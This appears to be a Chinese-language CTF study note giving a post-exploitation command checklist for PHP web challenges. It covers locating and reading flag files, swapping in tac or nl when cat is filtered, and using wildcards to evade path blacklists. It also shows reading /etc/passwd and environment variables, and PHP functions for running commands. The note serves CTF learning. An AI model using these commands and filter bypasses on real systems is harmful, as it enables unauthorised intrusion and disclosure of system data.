# 🗂 Web 笔记 04｜RCE 命令速查（拿到命令执行后跑什么）

> 记录自：NSSCTF [LitCTF 2023] PHP是世界上最好的语言 ｜ 2026-08-01
> 场景：你拿到了命令执行/代码执行，但不知道跑啥 → 照这个清单按顺序跑

---

## 一、先搞清楚：你手里是哪种"执行"？

| 类型 | 长什么样 | 能跑什么 |
|---|---|---|
| **代码执行** | `echo shell_exec('cmd');` | 跑 PHP 函数 + 系统命令 |
| **命令执行** | `cmd=cat /flag`（Vim题那种） | 跑系统命令 |
| **eval 代码执行** | 输入 `system('ls');` | 先写 PHP，PHP 再调系统命令 |

> 都一样，最后都能执行**系统命令**。下面的命令是"通用"的。

---

## 二、命令执行后的标准流程（照这个顺序）

### 第 1 步：先确认"我能执行"
```bash
echo "hello"          # 回显个东西，看有没有输出
id                    # 我是谁、什么权限
whoami                # 当前用户
```

### 第 2 步：列目录，找 flag 和网站文件
```bash
ls                    # 当前目录
ls /                  # 根目录（flag 常在这！）
ls /var/www/html      # web 根目录（源码在这）
pwd                   # 我现在在哪
```

### 第 3 步：全盘找 flag 文件 ★
```bash
find / -name "*flag*" 2>/dev/null          # 全盘搜名字带 flag 的文件
find / -name "flag" -o -name "flag.txt" 2>/dev/null
grep -r "NSSCTF{" / 2>/dev/null            # 直接在文件内容里搜 flag 格式
```

### 第 4 步：读文件（flag 找到了就 cat）
```bash
cat /flag
cat /flag.txt
cat /var/www/html/flag
```

---

## 三、读文件的命令全家桶（cat 被禁就用别的）

```bash
cat /flag          # 标准
tac /flag          # 倒着读（cat 被过滤时）
more /flag         # 分页
less /flag         # 分页
head /flag         # 从头读10行
tail /flag         # 从尾读10行
nl /flag           # 带行号
sed -n '1,100p' /flag   # 指定行
```

> ⚠️ 很多题会**过滤 `cat`**，这时换 `tac`/`more`/`nl` 等就绕过了（这叫"命令替换绕过"）。

### nl /* 与 nl /etc/* 的区别（★高频考点）

```bash
nl /*        # 只遍历根目录第一层：碰见普通文件打印，碰见文件夹报错，不进子目录
nl /etc/*    # 遍历 /etc 内部一级文件（能读到 /etc/passwd）
```

- `/*` 通配符**只匹配当前层级**，没有递归效果——`nl /*` 永远读不到 `/etc/passwd`（它在第二层，被 /etc 包着）
- 想读子目录文件就 `nl /etc/*`，或精确点 `nl /etc/pass*`（`*` 匹配任意字符，`?` 匹配单个字符）
- **通配符展开发生在 shell 内部**：过滤器检查的是你输入的字符串，`nl /etc/*` 里没有 `/etc/passwd` 字样，黑名单拦不住 → 放行后才展开成真实路径（路径黑名单绕过）

---

## 四、PHP 里执行命令的写法（RCE 常用函数）

```php
system('cat /flag');            // 直接输出，返回最后一行
shell_exec('cat /flag');        // ★ 返回完整输出字符串（最常用）
exec('cat /flag', $out);        // 输出到数组 $out
passthru('cat /flag');          // 直接输出原始
`cat /flag`;                    // 反引号 = shell_exec 的简写！
```

**最常用的姿势**（能 echo 出来）：
```php
echo shell_exec('ls /');
echo shell_exec('cat /flag');
```

---

## 五、PHP 读文件函数（不走系统命令，纯 PHP）

```php
echo file_get_contents('/flag');     // ★ 最常用
var_dump(file('/flag'));             // 按行数组
print_r(parse_ini_file('/flag'));    // 特殊格式
echo readfile('/flag');
highlight_file('/flag');             // 语法高亮显示源码
show_source('/flag');                // 同上
include('/flag');                    // 包含（文件内容是 PHP 可执行）
require('/flag');
```

> 系统命令被禁时（`system/shell_exec/exec` 都被 ban），就用 PHP 文件函数 `file_get_contents`。

---

## 六、其他实用命令

```bash
# 看源码 / 信息收集
ls -la                 # 看隐藏文件和权限
cat /etc/passwd        # 系统用户列表
env                    # 环境变量（可能有线索）
phpinfo();             # PHP 配置（RCE 里直接调这个函数）
whoami; id             # 权限

# 拿到更高权限后
cat /root/flag         # root 目录的 flag
ls /root               # 看 root 有啥
```

---

## 七、一句话总结

> **拿到 RCE 后：先 `ls /` 看根目录有没有 flag → 有就 `cat /flag` → 没有就 `find / -name "*flag*"` 全盘找 → 找到了用 cat 系列读出来。**
> **命令被过滤 → 换同功能的命令（tac/more/nl）或用 PHP 的 file_get_contents。**
